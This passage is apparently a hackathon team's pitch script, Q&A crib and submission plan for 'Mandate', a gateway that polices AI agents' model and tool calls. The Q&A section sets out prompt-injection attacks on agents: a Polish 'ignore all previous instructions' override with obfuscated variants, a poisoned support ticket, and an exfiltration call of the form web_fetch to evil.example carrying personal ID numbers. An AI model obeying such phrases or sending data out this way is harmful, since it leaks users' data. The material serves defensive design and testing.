| 10 | ★ | 6:00-6:40 | 2:25-2:45 | F (CISO view); B narrates | Threats → Export CSV; edit one line of `audit/gw-1-*.jsonl` → **Verify**; `docker compose stop guard` → re-run S4 (3-min: skip); **Run self-test** | Verify names the exact seq; header DEGRADED, fail-to-taint counter, S4 still denied; `{case_total}` cases, GAP vs FAIL; perf strip from `reports/perf.md` | `make test` terminal recording |
| 11 | ★ | 6:40-7:00 | 2:45-3:00 | L | adoption & scale slide, then residual-risk slide | one base URL, two stateless replicas + Valkey, K8s mapping, licences, offline; what we don't stop | slides only |

**3-minute cut:** beats 0, 1, 2, 4, 5, 10, 11 = 20 + 25 + 20 + 35 + 45 + 20 + 15 s = 3:00. Beat 5 is the one beat never shortened.

### 3.4 When something breaks on stage

- **Never debug live.** L says: "That beat is also a test in our suite. Here it is passing." F shows the junit row or the recorded clip, and we move on.
- **Model misbehaves:** `make demo-offline` (about 20 s); the header shows `LLM: mock`. Say so out loud.
- **Demo laptop dies:** A's hot spare is on the same tag and warmed; swap the HDMI cable. If both fail, play the 3-4 min video.
- **A judge types something unexpected** in the Playground: let it run; whatever the verdict, open the trace and read the rule, score and threshold. If it got through, say "good find, that becomes a case tonight", and D writes it down.

### 3.5 Never live (recorded clips only)

`docker compose kill gw-1` during the race · `docker compose stop valkey` · Claude Code with managed settings (P1) · the live `qwen3:8b` agent is a bonus, never a dependency.

---

## 4. Q&A crib

Every answer points to an artefact we can open in under 10 seconds. Sources: spec §12 crib, J1 §1 probes, J2 §7 questions, J3 §8.

### 4.1 The 15 most likely questions

| # | Question | Crisp answer | Show | Who |
|---|---|---|---|---|
| 1 | "I switched off your classifier. Why is the exfiltration still blocked?" | The classifier was never the guarantee. The mail tool may only send to destinations from the user's task, the policy or a trusted tool. `audit@evil.test` appeared only in fetched web content, so C24 denies it in every profile. Detectors add evidence and taint; they never lift a block. | Run tab of the S4 event; `policies/test-detectors-off.yaml` + the invariant line in `make test` | D |
| 2 | "From the agent container, `curl host.docker.internal:11434`?" | It fails: agents sit on an internal network whose only reachable host is our load balancer, and we probe that from inside the agent container in every `make test`. If the H1 probe leaked on Docker Desktop, say so: the fence then covers Valkey, control, guard, MCP and the internet, and the host-Ollama path is residual T5. | `reports/fence.json`; `make fence` live | L |
| 3 | "Polish: *Zignoruj wszystkie poprzednie instrukcje…*, then without diacritics, then in leetspeak?" | The normaliser folds diacritics and leetspeak before the Polish signature pack runs, so all three hit the same rule; multilingual similarity adds a score. System-prompt extraction trips a canary token, which doesn't care about language. Polish recall: `{pl_slice_tpr}` from `make eval`, or "not measured yet". | Playground trace with the `folded` view and rule ID; canary block | C (B backs up) |
| 4 | "Base64, zero-width splits, a Cyrillic homoglyph, 600 tokens of padding, then the injection?" | Each trick is undone into a view (decoded, stripped, skeleton, folded) and deterministic rules run over every view; the obfuscation matrix proves they're invariant. The classifier scans sliding 512-token windows over the whole input in one batch; anything past the window cap taints the run. | obfuscation-matrix rows in `make test`; Evidence tab with decoded text | B (C for windows) |
| 5 | "I drop or rotate the run header after taint, or put the attacker's address in a `role:user` message." | Run tokens are HMAC-signed by the gateway and minted only with a *user* credential. A missing or forged token lands in a sticky fallback run that keeps its taint and has only policy destinations. Chat content never mints a destination, whatever its role. | invariant cases (forged, absent, rotated token) | D (A on tokens) |
| 6 | "Exfiltrate through tool arguments: `web_fetch("https://evil.example/?d=<PESEL list>")`, or an external BCC?" | `web_fetch` is both an untrusted source and a sink: its host is a destination checked like an email recipient, and its query string is DLP- and entropy-scanned. External BCC is denied by the email validator. | the C14/C24 cases in `reports/results.jsonl` | D |
| 7 | "Your classifier is down for ten minutes at peak. Fail open or closed?" | Neither: fail-to-taint. The run is tainted, so sinks tighten; the header shows DEGRADED and a counter. We showed it in beat 10: guard stopped, S4 still denied. Honest residual: under `balanced`, a chat-only jailbreak passes with a flag while guard is down (T13); `strict` fails closed. | header guard cell; `aicl_fail_to_taint_total` | C |
| 8 | "Stop Valkey. What still works?" | Simulated external models fail closed (`503 spend_limit_unavailable`). Local models stay up, capped at 10% of the seat cap per replica and flagged degraded, so they're never a free lunch. Without run state every sink tool is ask/deny. | recorded clip; Overview health panel (fail-mode table) | C |
| 9 | "Kill one gateway mid-stream." | Caddy health-checks every second and drops it. Streams on that pod end and clients retry before content. The budget reservation expires by TTL, so nothing leaks. That replica's chain ends at its last flushed seq, and the checkpoints show it. | recorded drill | A |
| 10 | "What p95 overhead did *you* measure on this laptop? Time to first token with your holdback?" | `{p95_overhead_det_ms}` ms deterministic, `{p95_overhead_t2_ms}` ms with one classifier window, `+{holdback_ttft_ms}` ms to first token, on `{bench_machine}`. If the bench didn't ship: "Every request carries per-stage timings; here is this one." | `reports/perf.md`; Playground `Server-Timing` | A |
| 11 | "I edited the audit log and recomputed the whole chain." | Verify still catches it. The control plane signs every chain head with a key only it holds and stores the signature where gateways can't write. A recompute gives a checkpoint mismatch; truncation gives a checkpoint past the head. Tamper-evident, not tamper-proof: whoever holds both the key and the witness volume could rewrite; production uses WORM storage and an HSM. | **Verify** button; `aicl audit verify` | B |
| 12 | "I restarted a gateway and served yesterday's feed, serial 41." | Rejected. The last accepted serial per signing key is persisted in Valkey, so a restart doesn't reset it. A tampered bundle fails the signature; an expired one is kept as stale (amber), never silently unloaded. | feed suite rows; red feed cell | B |
| 13 | "How does this plug into Entra ID groups without code? What happens when someone leaves?" | The gateway validates JWTs against a JWKS URL and maps the `groups` claim to policy groups. A leaver is disabled in the IdP and their tokens stop validating; virtual keys are revoked in the policy file (live reload); agents they owned can be kill-switched (C26). Keycloak/LDAP federation is a P2 compose profile. | `identities` block in `policy.yaml`; `tools/mint_jwt.py` | A |
| 14 | "Isn't this the Claude apps gateway, or LiteLLM? And we already run Envoy and Apigee." | The Claude apps gateway governs Claude models, is OIDC-only and fails open by default (FACT-CHECK B4). LiteLLM needs a restart for YAML edits, and its JWT auth and SSO beyond 5 users are Enterprise (FACT-CHECK D2). We're vendor-neutral including local models, meter local compute, and add a detector-independent exfiltration guarantee, a signed exploit feed and a self-test. We don't replace Envoy or Apigee: they call our brain through `/v1/decide` (P1). | backup slide: vendor comparison (spec §2.4) | L |
| 15 | "What does it *not* stop?" | Harmful-but-allowed actions, low-bandwidth exfiltration inside allowed channels, a confused deputy through a CRM record the attacker controls, adaptive attacks on classifiers, and unmanaged host agents. Each has a partial mitigation, listed. | slide 10; `docs/RESIDUAL-RISKS.md` | L |

### 4.2 Also rehearse (one line each)

| Question | Answer |
|---|---|
| "I typed `enabeld: false`. Did I just disable PII?" | No. The strict schema rejects unknown keys; the last good version stays; red header with the YAML path. |
| "I deleted the `models:` section. Is everything allowed?" | No. Permissions are opt-in, so every model call gets 400. Controls are opt-out and show red when removed. |
| "How do I know replica 2 isn't stale?" | Heartbeats in Valkey; the header shows `1/2 on v{n}` and turns amber after 10 s. |
| "Can a hijacked agent reach approvals, policy or the console?" | No route (C35): the admin plane is on its own network; `lb` returns 404 on `/admin/*` and `/api/*`; the fence test proves it. |
| "How do you know your tests exercise each control?" | Meta-tests (≥ 1 POS + ≥ 2 NEG per enabled control, every green coverage cell has a passing tagged case), GAP vs FAIL, and the mutation kill rate if P1 #8 shipped. |
| "Malware or weapons request in Polish? Investment advice from a support bot?" | C11 topic pack (EN + PL, deterministic) plus harm exemplars; the guard-LLM lane is P1. Shown as blocks, not as a recall claim. |
| "Are you EU AI Act / SR 26-2 compliant?" | We don't claim compliance. We *support evidence for* Art. 12 logging; SR 26-2 explicitly excludes agentic AI, which is the gap we fill. |
| "Where does the audit go when a pod is evicted?" | Per-pod chain → OTel Collector → Kafka → SIEM; checkpoints to WORM storage. In the demo the chain ends at the last flushed seq, and Verify shows it. |
| "Your malicious MCP server reads the gateway's env or Valkey?" | It can't: MCP servers run in sandbox containers with no egress and no route to Valkey; the agent's token is stripped and a per-backend credential injected. |
| "Hot reload on Kubernetes?" | ConfigMap directory mount (never `subPath`), about 1 min to propagate; production uses Ed25519-signed bundles. We say the minute out loud. |

---

## 5. Submission package (HackTribe)

HackTribe asks for: **project title, team name, member list, project description, and a ≤ 10-slide PDF** (which may carry screenshots, the repo link, demo links and graphics). EN or PL is accepted (`docs/00` §4).

### 5.1 Title options

| # | Title | Why |
|---|---|---|
| 1 | **Mandate — agents get mandates, not keys** | The line judges remember after the pitch |
| 2 | **Mandate — agents get mandates, not keys (AI Control Layer)** | **Recommended for the form.** Same hook, plus the task's name, so a phase-1 mentor scanning the list knows what it is (spec §13.9) |
| 3 | Mandate: one policy brain for every agent call | Leads with the architecture; less memorable |
| 4 | Mandate: the AI control layer that holds when the detectors don't | States the guarantee; long |
| 5 | Mandate: authority, not detection, for bank AI agents | Names the thesis and the audience; slightly abstract |

The name is confirmed or replaced at H11 (spec §15 Q1). If it changes, only UI, README and PDF strings change; the code namespace stays `aicl`.

### 5.2 Short description (EN, 59 words)

> Agents get mandates, not keys. Mandate is a self-hosted AI control layer: every agent→LLM and agent→MCP call passes one hot-reloadable policy that redacts, blocks, budgets and audits it. Its exfiltration guarantee comes from authority, not detection: a hijacked agent can only send data where its user, the policy or a trusted tool allows, even with all AI detectors off.

### 5.3 Full project description (EN, ~300 words)

> **Mandate — agents get mandates, not keys.**
>
> Banks are connecting AI agents to models, tools and each other with credentials that open everything. In April 2026 the Fed, OCC and FDIC replaced SR 11-7 with SR 26-2, which explicitly leaves generative and agentic AI out of scope. Mandate is a control layer for that gap.
>
> Mandate is a self-hosted gateway on the only network path agents have. Agents change one base URL and one MCP URL. One policy file governs agent→LLM and agent→MCP traffic, and app→agent runs are minted by an authenticated user. Save the file and both gateway replicas apply it within seconds; an invalid edit is rejected and the last good policy stays live.
>
> Deterministic checks run first: checksum-validated PII (PESEL, IBAN, card numbers), secrets, a normaliser that decodes hidden Unicode and base64, tool-argument validators, and an allowlist-first, fail-closed model-file gate. Local AI models add depth: a windowed prompt-injection classifier and multilingual similarity over English and Polish examples. The guarantee, though, comes from authority, not detection. An agent may only send data to destinations named in the user's task, the policy or a trusted tool. Switch off every AI detector, hijack the model with a poisoned support ticket, and the exfiltration email is still denied. That is a test in our suite.
>
> Budgets are reserved before each call and settled after it, in tokens, money and local compute time, per organisation, team, user, agent and run; a race test across both replicas admits exactly the cap. Ten historical attacks, from malicious pickles and exposed Ray, Langflow and Ollama APIs to MCP tool poisoning and EchoLeak, are replayed as tests and blocked by rules from a separate, signed threat feed.
>
> Every decision lands in a hash-chained audit log with signed checkpoints, tagged with OWASP 2026 and MITRE ATLAS IDs. The console shows posture, coverage, spend and threats, and a built-in self-test re-runs after every policy change. `make test` runs offline, with no model and no GPU.

### 5.4 Short description (PL, 60 words)

> Agenci dostają pełnomocnictwa, nie klucze. Mandate to warstwa kontroli AI we własnej infrastrukturze: każde wywołanie agent→LLM i agent→MCP przechodzi przez jedną politykę zmienianą na żywo, która maskuje dane wrażliwe, blokuje ataki, pilnuje budżetów i audytuje. Ochronę przed wyciekiem dają uprawnienia, nie detekcja: przejęty agent wyśle dane tylko do odbiorców dopuszczonych przez użytkownika, politykę lub zaufane narzędzie, nawet bez detektorów AI.

Note: in everyday Polish *mandat* also means a traffic fine, so "agenci dostają mandaty" reads as "agents get fined". In Polish texts we say **pełnomocnictwa** (the banking term for a mandate); the brand name stays **Mandate**.

### 5.5 Claim check before pasting (at H20:30)

Each sentence below stays in the descriptions only if its test is green on `v1.0-submission`. If it's red, delete or soften the sentence; don't paste and hope.

| Claim in §5.2-§5.4 | Must be green |
|---|---|
| "both gateway replicas apply it within seconds; an invalid edit is rejected" | `tests/integration/test_live_edits.py` (hot reload & tamper suite) |
| "the exfiltration email is still denied" with detectors off | detectors-off invariant suite (S4/S5) |
| "a race test across both replicas admits exactly the cap" | `tests/integration/test_budget_race.py` |
| "Ten historical attacks … replayed as tests" | Exploit Museum suite E1-E10; change "Ten" to the green count |
| "signed threat feed" | feed suite (signature, rollback, tamper) |
| "windowed prompt-injection classifier" | `guard` with ONNX engine shipped (if only the stub shipped: "semantic tier stubbed in this build") |
| "multilingual similarity over English and Polish examples" | C10/C11 kNN with EN+PL exemplars shipped (cut line 7 removes it) |
| "hash-chained audit log with signed checkpoints" | audit suite incl. recompute-after-edit |
| "`make test` runs offline, with no model and no GPU" | IC5 clean-room run, Wi-Fi off (H17:30) |

### 5.6 Checklist and timing (spec §13.4)

The clock time of each checkpoint is written in at H0, once the AM/PM wording of the deadline is confirmed (spec §15 Q2). **H21 = the deadline minus 3 hours**, regardless.

| When | What | Owner | Done when |
|---|---|---|---|
| **H0** | Confirm deadline wording, which rubric weights apply, whether a submission can be edited after upload, and whether a video link is allowed. Create the HackTribe team, add all six members, fix `{team_name}`. | L | answers in the team chat |
| **H11** | **Placeholder submission:** title (option 2 unless renamed), team name, member list, short + full description v1, PDF v0 (title, architecture, plan). If the platform doesn't allow edits, do a checklist dry run instead. | L | confirmation screenshot |
| H16 | Feature freeze, tag `rc1`; screenshot list frozen. | L, F | tag exists |
| H17:30 | IC5 clean room on the hot spare, Wi-Fi off: `make doctor && make test && make demo-offline && make demo`. Fill `{make_test_*}`, `{case_*}`, `{fence_*}`, `{inv_*}`, `{race_*}`. | L | storyline test 100% |
| H18:00 | Video: 3-4 min of the full storyline + 20-40 s clips per beat. Upload unlisted, playable without login. | F, A | `{video_url}` works in a private window |
| H18:45 | PDF v1 (screenshots from `rc1`, placeholders filled). | L | 10 pages or fewer |
| H20:00 | Repo public: `gitleaks detect` clean on history; `make licenses`; NOTICE ("Built with Llama" if PG2/LG3 ship). | L | `{repo_url}` opens logged out |
| H20:30 | PDF v2 (L + F); claim check §5.5; descriptions final. | L, F | `make submission-check` green |
| **H21:00** | **Submit:** title, team, members, description, PDF, repo link, video link. A second person watches the screen. Save the confirmation screenshot to the team drive. Demo laptop on tag `v1.0-submission`. | L + one witness | confirmation screenshot saved |
| H21-H24 | Pitch prep: three rehearsals; storyline test 10 min before stage; `main` locked. | all awake | — |

**What to attach or link:**

- [ ] **PDF**: ≤ 10 slides, < 20 MB, fonts embedded, links clickable (`make submission-check`).
- [ ] **Repo link**: public, pointing at tag `v1.0-submission`. The README's first screen (spec §10.7) has: what it is in 3 lines, the architecture diagram, `make test` with a screenshot of the expected matrix, the raw `docker compose` command, `make demo-offline` / `make demo`, the `JUDGES.md` link, the perf table and the video link.
- [ ] **Video link**: unlisted, 3-4 min; also on slides 1 and 10. It is our fallback if a mentor can't run the stack.
- [ ] **`JUDGES.md`**: judge key, base URLs, files to edit, and the poke matrix (spec §10.8) with expected outcomes in EN and PL.
- [ ] **Member list** with each person's lane.
- [ ] **No hosted demo**, on purpose: it runs locally and offline. Say so in the description field if there is a "demo link" box, and give the one command instead.
- [ ] `docs/LICENSES.md`, `NOTICE`, `docs/RESIDUAL-RISKS.md` linked from the README.

---

## 6. Claims hygiene: say / never say

| Topic | Say | Never say | Why / source |
|---|---|---|---|
| Audit integrity | "tamper-evident: hash chain plus signed checkpoints held outside the writer" | "tamper-proof", "immutable" | Whoever holds both the checkpoint key and the witness volume can rewrite (spec §9.2) |
| Regulation (EU) | "supports evidence for EU AI Act Art. 12/19 logging; Annex III high-risk obligations apply from 2 Dec 2027 and Annex I from 2 Aug 2028 (Reg. (EU) 2026/1744)"; also DORA, ISO/IEC 42001, NIST AI RMF | "compliant", "certified", "the AI Act requires this from August 2026" | FACT-CHECK C7; spec §2.5 |
| Regulation (US) | "SR 26-2 (Fed, OCC Bulletin 2026-13, FDIC; 17 Apr 2026) explicitly excludes generative and agentic AI. We fill that gap." | "SR 26-2 compliant", "SR 11-7 compliance", "the Fed requires this", "Fed and OCC" without the FDIC | FACT-CHECK C5 |
| Pricing | "simulated commercial pricing" for every `sim/*` model | "we saved X on OpenAI", any real vendor spend figure | No paid keys exist at the event (`docs/00` §2) |
| agent→agent | "agent→agent is thin (P1): taint is inherited through the run token; ASI07 is partial" | "full A2A security", "ASI07 covered" | spec §3.6, §14.2 T16 |
| OCSF | "OCSF-shaped 1.9.0 export" (until the validator has passed) | "OCSF-compliant" | spec §2.5; FACT-CHECK C6 (`ai_operation` dates from 1.8.0, `record_integrity` is new in 1.9.0) |
| Polish detection | "this Polish attack was blocked by [rule ID] after normalisation"; "Polish recall `{pl_slice_tpr}` [`{ci}`] on our 100-prompt slice" only with `make eval` numbers | "we detect Polish jailbreaks", "multilingual detection quality", "Prompt Guard 2 works on Polish" | PG2 86M was not evaluated on Polish (FACT-CHECK A4) |
| Indirect injection | "taint and provenance carry the indirect-injection guarantee" | "our classifier catches indirect injection", "detects all jailbreaks" | protectai v2 is EN-only and doesn't detect jailbreaks (FACT-CHECK A5); R4 |
| ShadowRay | "CVE-2023-48022, disputed by Anyscale as by design, still unpatched; run Ray only on isolated networks" | "the patched Ray bug" | FACT-CHECK D7 |
| Amazon Q | "a wiper prompt was injected into Amazon Q's VS Code extension v1.84.0; AWS says it never executed (syntax error)" | "Amazon Q wiped machines" | FACT-CHECK D7 |
| Nx s1ngularity | "security researchers (Wiz, JFrog, OX) report the malware drove Claude, Gemini and Amazon Q CLIs with permission-skipping flags" | "the Nx advisory says Claude was abused" | FACT-CHECK D7: the advisory quotes the prompt but doesn't name the CLIs |
| Exposed Ollama | "~175,000 exposed Ollama hosts (SentinelLABS + Censys, Jan 2026)", source on the slide | "175,000 servers hacked"; the number without a source | R2 b4; not re-checked in FACT-CHECK, so verify before PDF v1 |
| Adaptive attacks | "OWASP LLM01:2026 cites > 90% adaptive-attack success against most defences" | "classifiers are useless" | R1 §2 (Nasr et al., 2025); detectors are still our evidence |
| Performance | "p95 overhead `{p95_overhead_det_ms}` ms measured on `{bench_machine}` (`reports/perf.md`)" | R4/R7 sandbox numbers as our latency; "zero overhead"; "real-time" without a number | J1 must-fix 14; spec §5.1, §10.6 |
| Budget race | "200 concurrent requests at a cap worth 50 → `{race_admitted}` admitted"; "naive check-then-charge overshot 400% *in our simulation*" | "0% overshoot" if the test isn't green on the tag; the 400% as a field measurement | spec §7.3; R8 |
| Local compute | "local compute time, measured as wall clock from dispatch at P0" | "exact GPU-seconds from Ollama" (unless P1 #11 shipped) | Ollama durations only exist on the native API (FACT-CHECK A2); residual T15 |
| Fence | "the agent container's only reachable host is the gateway, probed from inside it (`reports/fence.json`)" | the host-Ollama chokepoint if the H1 probe leaked | spec §3.4 fallback ladder; residual T5 |
| Guarantee scope | "exfiltration to a destination not authorised by the user, the policy or a trusted tool is denied, even with detectors off" | "prevents all data leaks", "unhackable", "un-jailbreakable" | residual T2, T3, T6 |
| Detection rates | self-graded next to held-out, with Wilson CIs | "99% detection", any single headline rate | J1 §3 item 7; spec §9.3 |
| Licences | "permissive OSS core (Apache-2.0 / MIT / BSD); optional Llama-licensed guard models with a Built with Llama notice" | "100% Apache", "all permissive" when PG2 or Llama Guard ship | spec §3.2; FACT-CHECK A4 |
| Claude apps gateway | "Claude-only, OIDC only (no SAML/LDAP, no CI service tokens), fails open by default, per its docs as of 2026-10-03" | "it has no budgets" or "no group allowlists" (it has both) | FACT-CHECK B4 |
| LiteLLM | "YAML edits need a restart; DB-stored settings reload every 30 s; JWT auth and SSO beyond 5 users are Enterprise" | "LiteLLM can't change config live" | FACT-CHECK D2 |
| Approvals | "`ask` returns 'approval required' (C23 is P1)", unless C23 shipped | "human-in-the-loop approvals" when it didn't ship | spec §4 C23 |
| Kubernetes | "K8s mapping"; add "manifests validated with kubeconform" only if P1 #16 shipped | "production-ready on Kubernetes", "Helm chart" | spec §3.8 |
| Frameworks | "OWASP MCP Top 10 (2025 edition, beta)"; "follows the OWASP Agent Control Standard decision vocabulary"; always the edition suffix (`LLM01:2026`) | "MCP Top 10 v0.1"; "ACS compliant"; bare `LLM03` (2025 and 2026 numbers differ) | FACT-CHECK C1, C3, B5 |
| Screenshots | real screenshots from the `rc1` tag; seeded history labelled `synthetic` | mockup screenshots presented as the product | spec §9.5; deck rule 3 |
| Polish wording | "pełnomocnictwa" | "mandaty" (reads as "traffic fines") | §5.4 note |
